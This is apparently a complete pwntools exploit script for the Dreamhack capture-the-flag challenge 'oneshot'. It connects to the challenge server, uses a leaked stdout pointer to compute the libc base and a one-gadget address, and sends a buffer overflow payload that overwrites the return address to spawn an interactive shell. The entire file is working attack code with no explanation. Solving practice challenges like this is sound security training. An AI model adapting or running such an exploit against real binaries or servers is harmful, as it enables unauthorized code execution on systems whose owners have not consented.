#! /usr/bin/python3

from pwn import *

p = remote('host1.dreamhack.games', 18201)
e = ELF('./oneshot')
libc = ELF('./libc.so.6')

p.recvuntil("stdout: ")
stdout = int(p.recvline()[:-1], 16)
stdout_offset = libc.sym['_IO_2_1_stdout_']

lb = stdout - stdout_offset
og = lb + 0x45216

payload = b'A'*0x18 + b'\x00' * 8 + b'B' * 8 + p64(og) 
p.sendafter("MSG: ", payload)
p.interactive()
